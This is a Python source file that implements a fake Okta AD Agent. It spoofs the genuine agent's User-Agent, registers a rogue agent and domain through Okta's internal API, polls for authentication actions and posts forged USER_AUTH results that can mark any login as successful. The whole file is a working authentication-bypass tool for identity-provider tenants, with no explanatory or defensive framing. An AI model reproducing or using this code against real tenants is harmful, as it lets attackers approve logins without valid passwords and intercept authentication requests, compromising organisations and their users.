import requests
import re
import uuid
import time

USER_AGENT = "Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled"
OKTA_CONNECTOR_CLIENT_ID = "cappT0Hfy97F1BoO1UTR"
OKTA_API_OAUTH_TOKEN = "/oauth2/token"
OKTA_API_CREATE_TOKEN = "/api/v1/tokens"
OKTA_API_CREATE_DOMAIN = "/api/1/internal/app/activedirectory/"
OKTA_API_INIT_AGENT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent?name=[HOSTNAME]"
OKTA_API_CHECKIN_AGENT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/actionResult?agentVersion=3.16.0.0"
OKTA_API_ACTION = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/nextAction?agentVersion=3.16.0&pollid=[POLL_ID]"
OKTA_API_ACTION_RESULT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/actionResult?responseId=[RESPONSE_ID]"

class OktaADAgent:
  def __init__(self, tenant: str, domain="", agent_id="", app_id="", device_name="", code="", api_key=""):
      self._tenant = tenant
      self._api_key = api_key
      self._domain = domain
      self._device_name = device_name
      self._code = code
      self._agent_id = agent_id
      self._app_id = app_id

  def _create_ad_connector_token(self):
    '''
    Creates a new AD Connector Token using the OAuth flow
    '''

    headers = {
      "User-Agent": USER_AGENT
    }

    data = {
      "grant_type":"api_token", 
      "code":self._code,
      "client_id":OKTA_CONNECTOR_CLIENT_ID
    }

    response = requests.post(f"https://{self._tenant}{OKTA_API_OAUTH_TOKEN}", headers=headers, data=data)
    jsonResponse = response.json()

    if "api_token" in jsonResponse:
      self._api_key = jsonResponse["api_token"]

    return self._api_key

  def _create_ad_domain(self):
    '''
    Creates a new AD Domain via the Okta Internal API
    If AD Domain already exists, the domain ID is retrieved
    '''

    data = f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><domain name="{self._domain}" />'
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": "SSWS " + self._api_key
    }
    
    response = requests.post(f"https://{self._tenant}{OKTA_API_CREATE_DOMAIN}", headers=headers, data=data)
    text = response.text
    matches = re.search('id="([^"]+)', text, re.IGNORECASE + re.MULTILINE) 
    if matches:
      self._app_id = matches.group(1)

    return self._app_id
  
  def _init_ad_agent(self):
    '''
    Initialises the AD Agent Name with Okta
    '''

    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": "SSWS " + self._api_key
    }

    url = OKTA_API_INIT_AGENT.replace("[DOMAIN_ID]", self._app_id).replace("[HOSTNAME]", self._device_name)

    response = requests.post(f"https://{self._tenant}{url}", headers=headers)
    text = response.text

    matches = re.search('id="([^"]+)', text, re.IGNORECASE + re.MULTILINE) 
    if matches:
      self._agent_id = matches.group(1)

    return self._agent_id

  def _checkin_ad_agent(self):
    '''
    Checks in the AD Agent, essentially marking it as ready to receive requests
    '''

    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": "SSWS " + self._api_key
    }

    data = f"""<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type>INIT</type>
  <status>SUCCESS</status>
  <timestamps>
    <actionRecieivedFromOkta />
    <actionSentToLdapServer />
    <responseReceivedFromLdapServer />
    <responseSentToOkta>{int(time.time())}</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20221210221429.278Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{}}</additionalInfo>
</agentActionResult>"""

    url = OKTA_API_CHECKIN_AGENT.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id)
    response = requests.post(f"https://{self._tenant}{url}", headers=headers, data=data)
    return response.text

  def start_action_listening(self):
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": "SSWS " + self._api_key
    }

    url = OKTA_API_ACTION.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id).replace("[POLL_ID]", str(uuid.uuid4()))
    
    response = requests.get(f"https://{self._tenant}{url}", headers=headers)
    return response.text

  def send_action_result(self, action_id: str, success=False):
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": "SSWS " + self._api_key
    }

    if success:
      status = "SUCCESS"
      message = ""
      error_code = ""
    else:
      status = "FAILURE"
      message = "Login Failed"
      error_code = "1326"

    r = re.search(":([^:]+)$", action_id, re.IGNORECASE + re.MULTILINE)
    if r:
      response_id = r.group(1)

    else:
      response_id = ""

    data = f"""<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="{action_id}">
  <type>USER_AUTH</type>
  <status>{status}</status>
  <message>{message}</message>
  <errorCode>{error_code}</errorCode>
  <timestamps>
    <actionRecieivedFromOkta>{int(time.time())}</actionRecieivedFromOkta>
    <actionSentToLdapServer>{int(time.time())}</actionSentToLdapServer>
    <responseReceivedFromLdapServer>{int(time.time())}</responseReceivedFromLdapServer>
    <responseSentToOkta>{int(time.time())}</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>20221211205617.898Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>20221211205617.898Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>20221211205617.898Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20221211205617.914Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>"""

    url = OKTA_API_ACTION_RESULT.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id).replace("[RESPONSE_ID]", response_id)
    response = requests.post(f"https://{self._tenant}{url}", headers=headers, data=data)
    return response.text

  def __enter__(self):

    # Create our AD connector
    if self._api_key != "":
      print("[*] Using Agent Token Method")
      return self
    
    print("[*] Creating Agent Token")
    token = self._create_ad_connector_token()
    print(f"[*] Token Created: {token}")
    
    print("[*] Getting Domain ID")
    domain_id = self._create_ad_domain()
    print(f"[*] Domain ID is {domain_id}")

    print("[*] Initialising AD Agent")
    agent_id = self._init_ad_agent()
    print(f"[*] Agent ID is {agent_id}")

    print("[*] Sending Agent Checkin")
    self._checkin_ad_agent()

    return self

  def __exit__(self, *args):
    pass

